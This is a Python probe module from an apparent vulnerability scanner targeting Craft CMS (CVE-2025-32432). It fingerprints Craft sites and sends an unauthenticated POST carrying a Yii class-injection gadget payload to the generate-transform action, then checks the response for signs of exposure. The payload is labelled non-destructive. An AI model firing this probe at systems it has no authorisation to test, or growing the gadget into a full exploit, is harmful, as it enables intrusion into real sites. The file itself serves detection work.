"""
Raw execution for craftcms_transform_rce_probe (CVE-2025-32432 / Jan 2026 PoC).
Probes Craft CMS instances for unauthenticated assets/generate-transform
action handling and Yii deserialization gadget chain exposure.
No parsing here -- parse.py's job.
"""
from __future__ import annotations

import json
from dataclasses import dataclass
from typing import Any, Dict, Optional

try:
    import requests
    import urllib3
    urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
except ImportError:
    requests = None

USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Tradecraft/1.0"


@dataclass
class RawCraftResult:
    target: str = ""
    base_url: str = ""
    craft_detected: bool = False
    endpoint_path: str = ""
    action_accessible: bool = False
    probe_status: Optional[int] = None
    probe_response_snippet: str = ""
    gadget_triggered: bool = False
    error: Optional[str] = None


def normalize_target_url(target: str) -> str:
    t = target.strip()
    if not t.startswith("http://") and not t.startswith("https://"):
        t = f"https://{t}"
    return t.rstrip("/")


def execute(
    target: str,
    host_header: Optional[str] = None,
    timeout: int = 8,
) -> RawCraftResult:
    if requests is None:
        return RawCraftResult(target=target, error="requests library not available")

    if not target or not target.strip():
        return RawCraftResult(target="", error="target is required")

    base_url = normalize_target_url(target)
    result = RawCraftResult(target=target.strip(), base_url=base_url)

    session = requests.Session()
    headers = {
        "User-Agent": USER_AGENT,
        "Accept": "application/json, text/html, */*",
    }
    if host_header and host_header.strip():
        headers["Host"] = host_header.strip()

    session.headers.update(headers)

    # Step 1: Detect Craft CMS presence
    try:
        r_home = session.get(f"{base_url}/", timeout=timeout, verify=False, allow_redirects=True)
        headers_str = str(r_home.headers).lower()
        cookies_str = str(session.cookies.get_dict()).lower()
        body_text = r_home.text.lower()

        if "craft" in headers_str or "craft_csrf_token" in cookies_str or "craft" in body_text:
            result.craft_detected = True
        else:
            try:
                r_admin = session.get(f"{base_url}/admin/login", timeout=timeout, verify=False, allow_redirects=True)
                if "craft" in r_admin.text.lower() or "craft" in str(r_admin.headers).lower():
                    result.craft_detected = True
            except requests.exceptions.RequestException:
                pass
    except requests.exceptions.RequestException as e:
        result.error = f"Initial connectivity check failed: {e}"
        return result

    # Step 2: Probe pre-auth generate-transform action endpoint
    # Test standard path and parameter-based action path
    candidate_paths = [
        "/actions/assets/generate-transform",
        "/?action=assets/generate-transform",
    ]

    probe_payload = {
        "assetId": 1,
        "handle": {
            "width": 1,
            "height": 1,
            "as tradecraft_probe": {
                "class": "craft\\behaviors\\FieldLayoutBehavior",
                "__class": "yii\\rbac\\PhpManager",
                "__construct()": [
                    {
                        "itemFile": "tradecraft_non_destructive_probe.php"
                    }
                ]
            }
        }
    }

    for path in candidate_paths:
        try:
            url = f"{base_url}{path}"
            r_action = session.post(
                url,
                json=probe_payload,
                headers={"Content-Type": "application/json"},
                timeout=timeout,
                verify=False,
                allow_redirects=False,
            )
            result.probe_status = r_action.status_code
            result.endpoint_path = path
            resp_text = r_action.text or ""
            result.probe_response_snippet = resp_text[:500]

            # In vulnerable Craft CMS (<= 5.6.16), pre-auth generate-transform processes the
            # handle behavior object, triggering Yii/Craft exception or deserialization error
            text_lower = resp_text.lower()
            if (
                "fieldlayoutbehavior" in text_lower
                or "phpmanager" in text_lower
                or "tradecraft_non_destructive_probe" in text_lower
                or "unknownpropertyexception" in text_lower
                or "yii\\base" in text_lower
            ):
                result.action_accessible = True
                result.gadget_triggered = True
                break
            elif r_action.status_code in (200, 400, 500) and (
                "craft" in text_lower or "asset not found" in text_lower or "invalid transform" in text_lower
            ):
                result.action_accessible = True
                # If it responds with Craft transform error without auth, endpoint is exposed
                break
            elif r_action.status_code in (401, 403):
                # Protected
                break

        except requests.exceptions.RequestException as e:
            if not result.error:
                result.error = f"generate-transform action probe failed on {path}: {e}"

    return result
